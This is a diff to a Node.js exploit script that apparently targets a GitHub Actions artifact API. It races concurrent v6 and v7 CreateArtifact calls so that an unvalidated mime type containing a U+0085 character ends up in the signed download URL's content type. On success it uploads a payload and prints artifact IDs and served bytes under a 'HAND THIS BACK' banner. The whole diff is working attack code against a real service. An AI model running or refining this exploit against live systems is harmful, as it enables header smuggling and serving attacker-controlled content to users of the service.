@@ -132,67 +132,61 @@ function usable(ct) {
 
 (async () => {
   const stamp = Date.now();
-  // Our own two measurements: v4/v6 store mime_type WITHOUT validating it (the NEL variant is
-  // accepted) but ignore it (rsct = application/zip), while v7 validates it strictly and uses it
-  // for rsct. So the question is whether one artifact record can hold a v6-stored (unvalidated)
-  // mime_type and still be served through the v7 path. Simplest shapes first: same-name recreate
-  // and finalize ordering, no racing.
+  // Parallel race: create the SAME artifact name twice at once, one as v6 with an unvalidated
+  // mime (v6 stores it but ignores it) and one as v7 with a clean mime (v7 uses mime for rsct).
+  // Sequential ordering always let the last create win, so the hope is that a concurrent
+  // interleaving attaches the v6-stored mime to the v7 delivery path. Unlike a build-and-pray
+  // loop, every round is judged immediately with GetSignedArtifactURL, so we stop on the first
+  // record whose rsct actually carries the 0x85.
   const ODD = '\u0085application/json';
   const CLEAN = 'application/json';
+  const ROUNDS = Number(process.env.ROUNDS || 64);
 
   const create = (name, version, mime) => twirp('CreateArtifact', {
     ...ids, name, version, mime_type: mime,
   });
-  const finalize = (name) => twirp('FinalizeArtifact', {
-    ...ids, name, size: String(PAD_TO),
-    hash: `sha256:${crypto.createHash('sha256').update(build(0)).digest('hex')}`,
+  const finalize = (name, bytes) => twirp('FinalizeArtifact', {
+    ...ids, name, size: String(bytes.length),
+    hash: `sha256:${crypto.createHash('sha256').update(bytes).digest('hex')}`,
   });
-  const del = (name) => twirp('DeleteArtifact', { ...ids, name });
-  const url = (r) => { try { return JSON.parse(r.body.toString('utf8')).signed_upload_url; } catch { return undefined; } };
+  const urlOf = (r) => { try { return JSON.parse(r.body.toString('utf8')).signed_upload_url; } catch { return undefined; } };
   const hex = (x) => Buffer.from(x || '', 'latin1').toString('hex');
 
-  const shapes = [
-    { tag: 'recreate-v6odd-then-v7', steps: ['c6odd', 'u', 'c7clean', 'u', 'f'] },
-    { tag: 'recreate-v7-then-v6odd', steps: ['c7clean', 'u', 'c6odd', 'u', 'f'] },
-    { tag: 'v6odd-finalize-then-v7', steps: ['c6odd', 'u', 'f', 'c7clean', 'u', 'f'] },
-    { tag: 'v6odd-fin-del-v7-fin', steps: ['c6odd', 'u', 'f', 'd', 'c7clean', 'u', 'f'] },
-    { tag: 'v7-fin-del-v6odd-fin', steps: ['c7clean', 'u', 'f', 'd', 'c6odd', 'u', 'f'] },
-  ];
-
+  const seen = {};
   let winner = null;
-  for (const sh of shapes) {
-    const name = `${sh.tag.replace(/[^a-z0-9-]/gi, '')}-${stamp}`;
-    let signed;
-    const log = [];
-    for (const step of sh.steps) {
-      if (step === 'u') { const r = await putBlob(signed, build(0), ODD); log.push(`put=${r.status}`); continue; }
-      if (step === 'f') { const r = await finalize(name); log.push(`fin=${r.status}`); continue; }
-      if (step === 'd') { const r = await del(name); log.push(`del=${r.status}`); continue; }
-      const version = step === 'c6odd' ? 6 : 7;
-      const r = await create(name, version, step === 'c6odd' ? ODD : CLEAN);
-      const u = url(r);
-      if (u) signed = u;
-      log.push(`${step}=${r.status}${u ? '' : '(no-url)'}`);
-    }
+  for (let i = 0; i < ROUNDS && !winner; i += 1) {
+    const name = `race-${i}-${stamp}`;
+    const specs = i % 2 ? [[7, CLEAN], [6, ODD]] : [[6, ODD], [7, CLEAN]];
+    const created = await Promise.all(specs.map(([v, m]) => create(name, v, m)));
+    const urls = created.map(urlOf).filter(Boolean);
+    if (!urls.length) { console.log(`[-] round ${i} no signed urls`); continue; }
+
+    const placeholder = build(0);
+    await Promise.all(urls.map((u) => putBlob(u, placeholder, ODD).catch(() => null)));
+    await Promise.allSettled([finalize(name, placeholder), finalize(name, placeholder)]);
+
     const sig = await signedUrlFor(name);
-    const id = await findId(name);
-    const dl = id ? await inspect(id) : {};
-    const hit = (sig.rsct || '').includes('\u0085') || (dl.served || '').includes('\u0085');
-    console.log(`[*] ${sh.tag}: ${log.join(' ')} id=${id} rsct=${JSON.stringify(sig.rsct)}`
-      + ` rsct_hex=${hex(sig.rsct)} served=${JSON.stringify(dl.served)}${hit ? '  <-- HIT' : ''}`);
-    if (hit && id && signed && !winner) winner = { tag: sh.tag, id, signed };
+    const key = JSON.stringify(sig.rsct);
+    seen[key] = (seen[key] || 0) + 1;
+    if ((sig.rsct || '').includes('\u0085')) {
+      const id = await findId(name);
+      console.log(`[!] round ${i} rsct=${key} hex=${hex(sig.rsct)} id=${id}  <-- HIT`);
+      if (id) winner = { name, id, urls, rsct: sig.rsct };
+    } else if (i % 8 === 0) {
+      console.log(`[*] round ${i} rsct=${key}`);
+    }
   }
 
+  console.log('\nrsct distribution: ' + JSON.stringify(seen));
   console.log('\n===== HAND THIS BACK =====');
   console.log('HIT=' + Boolean(winner));
   if (winner) {
     const payload = build(winner.id);
-    const put2 = await putBlob(winner.signed, payload, ODD);
+    await Promise.all(winner.urls.map((u) => putBlob(u, payload, ODD).catch(() => null)));
     const dl = await inspect(winner.id);
-    console.log('TAG=' + winner.tag);
     console.log('REPOSITORY=' + `${REPO.toLowerCase()}/actions/artifacts/${winner.id}/zip`);
     console.log('ARTIFACT_ID=' + winner.id);
-    console.log('REPUT=' + put2.status);
+    console.log('RSCT_HEX=' + hex(winner.rsct));
     console.log('SERVED_CT_HEX=' + hex(dl.served));
     console.log('BODY_OK=' + (dl.body ? dl.body.equals(payload) : false));
     console.log('BODY_B64=' + (dl.body ? dl.body.toString('base64') : ''));
